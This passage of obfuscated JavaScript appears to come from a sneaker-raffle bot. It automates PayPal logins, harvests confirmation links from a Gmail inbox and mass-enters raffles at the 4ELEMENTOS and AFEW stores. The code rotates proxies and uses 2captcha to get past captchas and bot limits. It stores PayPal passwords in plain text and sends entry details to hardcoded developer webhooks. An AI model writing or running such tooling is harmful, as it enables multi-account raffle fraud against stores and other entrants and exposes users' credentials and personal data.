        _0x189eb6['Proxy'] = _0xede088[_0x36999f], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x3fc1d2 = await _0x4e7197['get']('Password');
        return _0x189eb6['Password'] = _0x3fc1d2['Password'], _0x3f8380['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x189eb6['Email'] + ',' + _0x189eb6['Password'] + ',' + _0x189eb6['Proxy']), _0x189eb6;
    }
    let _0x5ef141 = await _0x5e5eab();
    var _0x3b98f5 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x34bfa2 = await _0x4e7197['get']('Amount'), _0x3c5180 = _0x34bfa2['Amount'];
    async function _0x5619d9() {
        let _0x5ac63e = 0x0;
        var _0x177420 = new _0x2a51ab({
            'user': _0x51f80a['masterMail'],
            'password': _0x51f80a['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x3b4eaf(_0xc64b1e) {
            _0x177420['openBox']('INBOX', ![], _0xc64b1e);
        }
        _0x177420['once']('ready', function () {
            _0x3b4eaf(function (_0xc02765, _0x599f70) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0xc02765)
                    throw _0xc02765;
                _0x177420['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x3061bf, _0x2799e3) {
                    if (!_0x2799e3 || !_0x2799e3['length'])
                        console['log'](_0x5c3ac1() + '\x20[' + _0x2f3f20 + ']\x20No\x20mails\x20found'), _0x177420['end']();
                    else {
                        _0x2799e3 = _0x2799e3['slice'](0x0, _0x3c5180);
                        var _0x4e36b0 = _0x177420['seq']['fetch'](_0x2799e3, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x4e36b0['on']('message', function (_0x85fdd0, _0x508be7) {
                            var _0x1591b5 = '(#' + _0x508be7 + ')\x20';
                            _0x85fdd0['on']('body', function (_0x5407cb, _0x1a734c) {
                                _0xfebb(_0x5407cb, (_0x3d9163, _0x153f34) => {
                                    if (_0x153f34['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x153f34['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x153f34['text']['split']('[')[0x2];
                                        var _0x402544 = mes['split'](']')[0x0];
                                        _0x3b98f5['push'](_0x402544);
                                    }
                                });
                            }), _0x85fdd0['once']('end', function () {
                                _0x5ac63e++;
                            });
                        }), _0x4e36b0['once']('error', function (_0x1b6e4d) {
                            console['log']('Fetch\x20error:\x20' + _0x1b6e4d);
                        }), _0x4e36b0['once']('end', function () {
                            _0x177420['end']();
                        });
                    }
                });
            });
        }), _0x177420['once']('error', function (_0xc6a886) {
            console['log'](_0x2c0b56['red'](_0xc6a886['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x177420['once']('end', async function () {
        }), _0x177420['connect']();
    }
    try {
        _0x5619d9(), await _0xf987cc(0xfa0), console['log']('Found\x20' + _0x3b98f5['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xf987cc(0xfa0);
    }
    var _0x1ff2e8;
    _0x5c316f('' + _0x2f3f20);
    var _0x3dc654 = _0x5ef141['Proxy']['split'](':'), _0x2e9a2e;
    try {
        _0x2e9a2e = await _0x39c115['launch']({
            'userDataDir': 'sessions/' + _0x5ef141['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3dc654[0x0] + ':' + _0x3dc654[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x2e9a2e = await _0x39c115['launch']({
            'userDataDir': 'sessions/' + _0x5ef141['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3dc654[0x0] + ':' + _0x3dc654[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x5c3ac1() + '\x20[' + _0x2f3f20 + ']\x20Getting\x20Session');
        const _0x57dfee = await _0x2e9a2e['newPage']();
        await _0x57dfee['authenticate']({
            'username': '' + _0x3dc654[0x2],
            'password': '' + _0x3dc654[0x3]
        }), await _0x57dfee['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x57dfee['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x5c3ac1() + '\x20[' + _0x2f3f20 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x57dfee['waitForSelector']('#email');
            let _0x595b9b = await _0x57dfee['$eval']('#email', _0x49d493 => _0x49d493['getAttribute']('value'));
            if (_0x595b9b == '') {
                await _0x57dfee['type']('#email', _0x5ef141['Email']), await _0xf987cc(0x1d3);
                let _0x11211e = await _0x57dfee['$']('#splitPassword');
                _0x11211e && (await _0x57dfee['click']('#btnNext'), await _0xf987cc(0xa28)), await _0x57dfee['type']('#password', _0x5ef141['Password']), await _0xf987cc(0x35c), await _0x57dfee['click']('#btnLogin');
            } else
                await _0x57dfee['type']('#password', _0x5ef141['Password']), await _0xf987cc(0x35c), await _0x57dfee['click']('#btnLogin');
            await _0x57dfee['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x5c3ac1() + '\x20[' + _0x2f3f20 + ']\x20Successfully\x20logged\x20in'), await _0xf987cc(0x2710);
        } catch (_0x3c5a81) {
            throw new Error('Login\x20session\x20expired\x20' + _0x3c5a81);
        }
        for (var _0x1df957 = 0x0; _0x1df957 < _0x3b98f5['length']; _0x1df957++) {
            console['log'](_0x5c3ac1() + '\x20[' + _0x2f3f20 + ']\x20Task\x20' + (_0x1df957 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x5c316f(_0x2f3f20 + '\x20Task\x20' + (_0x1df957 + 0x1) + '\x20/\x20' + _0x3b98f5['length']);
            const _0x505749 = await _0x2e9a2e['newPage']();
            await _0x505749['goto']('' + _0x3b98f5[_0x1df957], { 'waitUntil': 'networkidle2' }), await _0xf987cc(0xbb8);
            try {
                const _0x3e6b08 = await _0x505749['$']('#challenge-heading');
                _0x3e6b08 && (console['log'](_0x5c3ac1() + '\x20[' + _0x2f3f20 + ']\x20Task\x20' + (_0x1df957 + 0x1) + '\x20:\x20' + _0x2c0b56['yellow']('2FA\x20Required')), await _0x505749['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0xf987cc(0x9c40), await _0x505749['waitForSelector']('#payment-submit-btn'), await _0x505749['$eval']('#payment-submit-btn', _0x25ef13 => _0x25ef13['click']()), await _0x505749['click']('#payment-submit-btn');
                try {
                    await _0x505749['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0xf987cc(0x5dc), console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x2f3f20 + ']\x20Task\x20' + (_0x1df957 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x1b51a7) {
                    _0x58760c = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x1b51a7['message']);
                } finally {
                    if (_0x58760c == 'yes' && _0x353f10 != 0x2) {
                        console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x2f3f20['name'] + ']\x20Task\x20' + (_0x1df957 + 0x1) + '\x20:\x20Retrying\x20(' + _0x353f10 + '\x20/\x205)')), _0x1df957 = _0x1df957 - 0x1, _0x353f10 = _0x353f10 + 0x1;
                        continue;
                    }
                    _0x58760c == 'yes' && _0x353f10 >= 0x2 && (_0x46ac44(csv[_0x1df957], _0x2f3f20), _0x58760c = 'no', _0x353f10 = 0x0), await _0x505749['close'](), await _0xf987cc(0x4650);
                }
            } catch (_0x16e2bf) {
                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x2f3f20 + ']\x20Task\x20' + (_0x1df957 + 0x1) + '\x20:\x20' + _0x16e2bf));
            }
        }
    } catch (_0x4cdd81) {
        console['log'](_0x2c0b56['red']('' + _0x4cdd81));
    } finally {
        await _0x2e9a2e['close']();
    }
}
const _0x3d5832 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x29ed42, _0x14ef6e, _0x3592ab) {
                    _0x39c115['use'](_0x5cc924()), _0x39c115['use'](_0x63578e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51f80a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x217009 = 0x0; _0x217009 < _0x14ef6e['length']; _0x217009++) {
                        if (_0x123e00 != 'yes')
                            var _0x123e00 = '', _0x58235a = 0x0;
                        var _0x615a5f;
                        try {
                            await _0x3d5d40(_0x14ef6e, _0x217009);
                        } catch {
                            _0x123e00 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x5c316f(_0x29ed42['name'] + '\x20Task\x20' + (_0x217009 + 0x1) + '\x20/\x20' + _0x14ef6e['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd);
                        var _0x2567e8 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x1b6dc3 = Math['round'](Math['random']() * (_0x2567e8['length'] - 0x1));
                        _0x14ef6e[_0x217009]['Size'] == 'RANDOM' && (_0x14ef6e[_0x217009]['Size'] = _0x2567e8[_0x1b6dc3]);
                        var _0xefc3cd = Math['round'](Math['random']() * (_0x3592ab['length'] - 0x1)), _0x222b4c = _0x3592ab[_0xefc3cd]['split'](':'), _0xec5a0c;
                        try {
                            _0xec5a0c = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x222b4c[0x0] + ':' + _0x222b4c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xec5a0c = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x222b4c[0x0] + ':' + _0x222b4c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x5c3ac1() + '\x20[' + _0x29ed42['name'] + ']\x20Task\x20' + (_0x217009 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x33bb8e = await _0xec5a0c['newPage']();
                            await _0x33bb8e['authenticate']({
                                'username': '' + _0x222b4c[0x2],
                                'password': '' + _0x222b4c[0x3]
                            }), await _0x33bb8e['setRequestInterception'](!![]), _0x33bb8e['on']('request', _0x358764 => {
                                _0x358764['resourceType']() === 'image' || _0x358764['resourceType']() === 'font' || _0x358764['resourceType']() === 'media' ? _0x358764['abort']() : _0x358764['continue']();
                            }), await _0x33bb8e['goto'](_0x14ef6e[_0x217009]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x5c3ac1() + '\x20[' + _0x29ed42['name'] + ']\x20Task\x20' + (_0x217009 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x33bb8e['waitForSelector']('#accept-all-gdpr'), await _0x33bb8e['click']('#accept-all-gdpr'), await _0x33bb8e['waitForSelector']('#raffles-product'), await _0xf987cc(0x3e8), await _0x33bb8e['$eval']('#raffles-product', _0x5d8510 => _0x5d8510['click']()), await _0xf987cc(0x1388), await _0x33bb8e['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x46fa9a = await _0x33bb8e['$']('.fancybox-inner\x20>\x20iframe'), _0x2d7990 = await _0x46fa9a['contentFrame']();
                            console['log'](_0x5c3ac1() + '\x20[' + _0x29ed42['name'] + ']\x20Task\x20' + (_0x217009 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x2d7990['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0xf987cc(0x1f4), await _0x2d7990['type']('input[name=\x22sm-form-email\x22]', _0x14ef6e[_0x217009]['Email']), await _0xf987cc(0xc8), await _0x2d7990['type']('input[name=\x22sm-form-name\x22]', _0x14ef6e[_0x217009]['FirstName'] + '\x20' + _0x14ef6e[_0x217009]['LastName']), await _0xf987cc(0xc8), await _0x2d7990['type']('input[name=\x22sm-form-street\x22]', _0x14ef6e[_0x217009]['Address1'] + '\x20' + _0x14ef6e[_0x217009]['HouseNumber'] + '\x20' + _0x14ef6e[_0x217009]['Address2']), await _0xf987cc(0xc8), await _0x2d7990['type']('input[name=\x22sm-form-city\x22]', _0x14ef6e[_0x217009]['City']), await _0xf987cc(0xc8), await _0x2d7990['type']('input[name=\x22sm-form-province\x22]', _0x14ef6e[_0x217009]['State']), await _0xf987cc(0xc8), await _0x2d7990['type']('input[name=\x22sm-form-zip\x22]', _0x14ef6e[_0x217009]['Zip']), await _0xf987cc(0xc8), await _0x2d7990['type']('input[name=\x22sm-form-country\x22]', _0x14ef6e[_0x217009]['Country']), await _0xf987cc(0xc8), await _0x2d7990['type']('input[name=\x22sm-form-phone\x22]', _0x14ef6e[_0x217009]['Phone']), await _0xf987cc(0xc8), await _0x2d7990['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x14ef6e[_0x217009]['Follower']), await _0xf987cc(0xc8), await _0x2d7990['type']('input[name=\x22sm-cst.size\x22]', _0x14ef6e[_0x217009]['Size']), await _0xf987cc(0x1f4), await _0x2d7990['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0xf987cc(0x1f4), await _0x2d7990['click']('.icheckbox_simple-custom'), await _0xf987cc(0x1f4), console['log'](_0x5c3ac1() + '\x20[' + _0x29ed42['name'] + ']\x20Task\x20' + (_0x217009 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x2d7990['$eval']('form', _0x38d174 => _0x38d174['submit']()), console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x29ed42['name'] + ']\x20Task\x20' + (_0x217009 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x123e00 = '';
                            var _0x248a5e = await _0x539676(_0x14ef6e[_0x217009], _0x29ed42, 'dev', ![]), _0x19516d = await _0x539676(_0x14ef6e[_0x217009], _0x29ed42, 'pub', ![]);
                            const _0x29827e = {
                                'succesDEVMSG': { 'embeds': [_0x248a5e] },
                                'succesPUBMSG': { 'embeds': [_0x19516d] }
                            };
                            try {
                                _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x29827e['succesDEVMSG']), await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x29827e['succesDEVMSG']), await _0xf987cc(0xc8), await _0x215470(_0x255a14, _0x29827e['succesPUBMSG']);
                            } catch (_0x50faf4) {
                                console['log'](_0x2c0b56['yellow'](_0x5c3ac1() + '\x20[' + _0x29ed42['name'] + ']\x20Task\x20' + (_0x217009 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x50faf4));
                            }
                        } catch (_0x5611c5) {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x29ed42['name'] + ']\x20Task\x20' + (_0x217009 + 0x1) + '\x20:\x20' + _0x5611c5)), _0x615a5f = '' + _0x5611c5;
                            var _0xf7aa86 = await _0x539676(_0x14ef6e[_0x217009], _0x29ed42, 'dev', !![], _0x615a5f), _0x248a5e = await _0x539676(_0x14ef6e[_0x217009], _0x29ed42, 'dev', ![]), _0x19516d = await _0x539676(_0x14ef6e[_0x217009], _0x29ed42, 'pub', ![]);
                            const _0x423a0d = {
                                'succesDEVMSG': { 'embeds': [_0x248a5e] },
                                'succesPUBMSG': { 'embeds': [_0x19516d] }
                            };
                            _0x423a0d['errorDEV'] = { 'embeds': [_0xf7aa86] }, _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x423a0d['errorDEV']), await _0x215470(_0x1dec8a, _0x423a0d['errorDEV']), _0x5611c5 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x123e00 = 'yes');
                        } finally {
                            _0xec5a0c['close']();
                            if (_0x123e00 == 'yes' && _0x58235a != 0x5 && _0x615a5f != 'Size\x20Not\x20Found') {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x29ed42['name'] + ']\x20Task\x20' + (_0x217009 + 0x1) + '\x20:\x20Retrying\x20(' + _0x58235a + '\x20/\x205)\x20')), _0x217009 = _0x217009 - 0x1, _0x58235a = _0x58235a + 0x1;
                                continue;
                            }
                            _0x123e00 == 'yes' && _0x58235a >= 0x5 && (_0x46ac44(_0x14ef6e[_0x217009], _0x29ed42), _0x123e00 = 'no', _0x58235a = 0x0), console['log'](_0x5c3ac1() + '\x20[' + _0x29ed42['name'] + ']\x20Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0xf8c5c5, _0x2f898e) {
                    var _0x4ab316 = [];
                    async function _0x4b2951() {
                        var _0x26e296 = new _0x2a51ab({
                            'user': _0x51f80a['masterMail'],
                            'password': _0x51f80a['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x368f5b(_0x15a03b) {
                            _0x26e296['openBox']('INBOX', ![], _0x15a03b);
                        }
                        _0x26e296['once']('ready', function () {
                            _0x368f5b(function (_0x63bc2c, _0x1572dc) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x63bc2c)
                                    throw _0x63bc2c;
                                _0x26e296['seq']['search'](['UNSEEN'], function (_0x3cbe74, _0x831ca4) {
                                    if (!_0x831ca4 || !_0x831ca4['length'])
                                        console['log'](_0x5c3ac1() + '\x20[' + _0xf8c5c5['name'] + ']\x20No\x20mails\x20found'), _0x26e296['end']();
                                    else {
                                        var _0x22e3d7 = _0x26e296['seq']['fetch'](_0x831ca4, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x22e3d7['on']('message', function (_0x1db956, _0x3f218a) {
                                            var _0x4c6090 = '(#' + _0x3f218a + ')\x20';
                                            _0x1db956['on']('body', function (_0x4433de, _0x24c610) {
                                                _0xfebb(_0x4433de, (_0x5d0ff7, _0x4842d8) => {
                                                    if (_0x4842d8['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x1afa4e = _0x4842d8['html']['split']('\x0a');
                                                        for (var _0x5e125e = 0x0; _0x5e125e < _0x1afa4e['length']; _0x5e125e++) {
                                                            if (_0x1afa4e[_0x5e125e]['includes']('salesmanago') && _0x1afa4e[_0x5e125e]['includes']('<td') && _0x1afa4e[_0x5e125e]['includes']('href')) {
                                                                var _0x4ff464 = _0x1afa4e[_0x5e125e]['split']('href=\x22'), _0x3d5cf9 = _0x4ff464[0x1]['split']('\x22')[0x0];
                                                                _0x4ab316['push'](_0x3d5cf9);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x1db956['once']('end', function () {
                                            });
                                        }), _0x22e3d7['once']('error', function (_0x414403) {
                                            console['log']('Fetch\x20error:\x20' + _0x414403);
                                        }), _0x22e3d7['once']('end', function () {
                                            _0x26e296['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x26e296['once']('error', function (_0x1be9be) {
                            console['log'](_0x2c0b56['red'](_0x1be9be['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x26e296['once']('end', async function () {
                        }), _0x26e296['connect']();
                    }
                    async function _0x363222(_0xec69d8, _0x120a80, _0x40c2ae) {
                        for (var _0x5f0de2 = 0x0; _0x5f0de2 < _0x120a80['length']; _0x5f0de2++) {
                            async function _0x167f29(_0x40b873, _0x1a63e9, _0x25207b, _0x51deed, _0x3a65b9) {
                                var _0x1f8394, _0x5cf534 = {}, _0x4c3fdb = [], _0x580d31 = {}, _0x2ce267 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x38a991 = Math['round'](Math['random']() * (_0x2ce267['length'] - 0x1));
                                _0x51deed[_0x40b873]['Size'] == 'RANDOM' && (_0x51deed[_0x40b873]['Size'] = _0x2ce267[_0x38a991]);
                                !_0x51deed && (_0x51deed = {});
                                if (_0x51f80a['useRandomProxy'] = ![])
                                    var _0xdd0312 = _0x3a65b9[_0x40b873]['split'](':');
                                else
                                    var _0x25a66a = Math['round'](Math['random']() * (_0x3a65b9['length'] - 0x1)), _0xdd0312 = _0x3a65b9[_0x25a66a]['split'](':');
                                var _0x411567 = {
                                    'jar': _0x4e0120,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x25207b['url'],
                                    'headers': _0x25207b['headers'],
                                    'body': JSON['stringify'](_0x5cf534),
                                    'proxy': 'http://' + _0xdd0312[0x2] + ':' + _0xdd0312[0x3] + '@' + _0xdd0312[0x0] + ':' + _0xdd0312[0x1]
                                };
                                return _0x1a63e9 != 'ver' && (_0x411567['url'] = _0x25207b['url'], _0x411567['headers'] = _0x25207b['headers']), _0x1a63e9 == 'ver' && (_0x411567['method'] = 'GET', _0x411567['url'] = _0x51deed[_0x40b873]), new Promise(function (_0xb4841b, _0x430250) {
                                    callback = async (_0x737d65, _0x1afb2b, _0x513ebf) => {
                                        if (!_0x737d65 && _0x1afb2b['statusCode'] == 0xca || !_0x737d65 && _0x1afb2b['statusCode'] == 0xc8) {
                                            if (_0x1a63e9 != 'ver') {
                                                var _0x2283f9 = await _0x539676(_0x51deed[_0x40b873], _0x25207b, 'dev', ![]), _0x2c7f73 = await _0x539676(_0x51deed[_0x40b873], _0x25207b, 'pub', ![]);
                                                const _0x4631ed = {
                                                    'succesDEVMSG': { 'embeds': [_0x2283f9] },
                                                    'succesPUBMSG': { 'embeds': [_0x2c7f73] }
                                                };
                                                if (_0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '')
                                                    try {
                                                        await _0x215470(_0x51f80a['webhook'], _0x4631ed['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x4631ed['succesDEVMSG']), await _0xf987cc(0xc8);
                                                try {
                                                    await _0x215470(_0x255a14, _0x4631ed['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x46ba09(_0x51deed[_0x40b873], _0x25207b);
                                            }
                                            _0xb4841b(console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x25207b['name'] + ']\x20Task\x20' + (_0x40b873 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x1a63e9 != 'ver') {
                                                var _0x1856fb = '' + _0x737d65, _0x59d8c5 = await _0x539676(_0x51deed[_0x40b873], _0x25207b, 'dev', !![], _0x1856fb), _0x1f0d74 = {};
                                                _0x1f0d74['errorDEV'] = { 'embeds': [_0x59d8c5] }, _0x46ac44(_0x51deed[_0x40b873], _0x25207b), _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x1f0d74['errorDEV']), await _0x215470(_0x1dec8a, _0x1f0d74['errorDEV']);
                                            }
                                            _0x430250(console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x25207b['name'] + ']\x20Task\x20' + (_0x40b873 + 0x1) + ':\x20' + _0x737d65)));
                                        }
                                    };
                                    try {
                                        _0x1a63e9 != 'ver' ? console['log'](_0x5c3ac1() + '\x20[' + _0x25207b['name'] + ']\x20Task\x20' + (_0x40b873 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5cf534['data']['attributes']['email']) : console['log'](_0x5c3ac1() + '\x20[' + _0x25207b['name'] + ']\x20Task\x20' + (_0x40b873 + 0x1) + ':\x20Fetching\x20Response'), _0x497c42(_0x411567, callback);
                                    } catch (_0x24cbcb) {
                                        console['log'](_0x5c3ac1() + '\x20Task\x20' + (_0x40b873 + 0x1) + ':\x20' + _0x24cbcb);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x167f29(_0x5f0de2, 'ver', _0xec69d8, _0x120a80, _0x40c2ae), console['log'](_0x5c3ac1() + '\x20[' + _0xec69d8['name'] + ']\x20Sleeping\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                            } catch (_0x289e0a) {
                            }
                        }
                    }
                    try {
                        _0x4b2951(), await _0xf987cc(0xfa0), console['log']('Found\x20' + _0x4ab316['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x363222(_0xf8c5c5, _0x4ab316, _0x2f898e);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x29dce7, _0x110449, _0x1f6cf9) {
                for (var _0x4c166c = 0x0; _0x4c166c < _0x110449['length']; _0x4c166c++) {
                    _0x51f80a['AfewDelay'] = _0x51f80a['delay'];
                    var _0x15cd68;
                    if (_0x3dc99 != 'yes')
                        var _0x3dc99 = '', _0x49666f = 0x0;
                    var _0xc09bf2 = _0x110449[_0x4c166c]['Url'], _0x536f11 = _0x110449[_0x4c166c];
                    _0x5c316f(_0x29dce7['name'] + '\x20Task\x20' + (_0x4c166c + 0x1) + '\x20/\x20' + _0x110449['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd);
                    try {
                        await _0x3d5d40(_0x110449, _0x4c166c);
                    } catch {
                        _0x3dc99 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x213a4e(_0x588283) {
                        const _0x27fae5 = _0x3f8380['readFileSync']('../successful-tasks.csv', 'utf8'), _0x26fac8 = _0x11f8e1['parse'](_0x27fae5, { 'header': !![] })['data'];
                        let _0x4faf78 = ![];
                        for (var _0x4c4e94 of _0x26fac8) {
                            if (_0x4c4e94['Url'] == _0x588283['Url'] && _0x4c4e94['Email'] == _0x588283['Email']) {
                                _0x4faf78 = !![];
                                break;
                            }
                        }
                        return _0x4faf78;
                    }
                    if (await _0x213a4e(_0x110449[_0x4c166c]) == !![]) {
                        console['log'](_0x5c3ac1() + '\x20[' + _0x29dce7['name'] + ']\x20Task\x20' + (_0x4c166c + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x2cbfeb = await _0x539676(_0x110449[_0x4c166c], _0x29dce7, 'dev', ![]), _0x4e7669 = await _0x539676(_0x110449[_0x4c166c], _0x29dce7, 'pub', ![]);
                    const _0x20819f = {
                        'succesDEVMSG': { 'embeds': [_0x2cbfeb] },
                        'succesPUBMSG': { 'embeds': [_0x4e7669] }
                    };
                    if (_0x110449[_0x4c166c]['Email'] == '' || _0x110449[_0x4c166c]['FirstName'] == '' || _0x110449[_0x4c166c]['LastName'] == '' || _0x110449[_0x4c166c]['Country'] == '' || _0x110449[_0x4c166c]['Size'] == '' || _0x110449[_0x4c166c]['Address1'] == '' || _0x110449[_0x4c166c]['Zip'] == '') {
                        console['log'](_0x5c3ac1() + '\x20[' + _0x29dce7['name'] + ']\x20Task\x20' + (_0x4c166c + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x51f80a['useRandomProxy'] = ![])
                        var _0x8a857d = _0x1f6cf9[_0x4c166c]['split'](':');
                    else
                        var _0xa109f9 = Math['round'](Math['random']() * (_0x1f6cf9['length'] - 0x1)), _0x8a857d = _0x1f6cf9[_0xa109f9]['split'](':');
                    var _0xd54433;
                    try {
                        _0xd54433 = await _0x39c115['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x8a857d[0x0] + ':' + _0x8a857d[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0xd54433 = await _0x39c115['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x8a857d[0x0] + ':' + _0x8a857d[0x1],
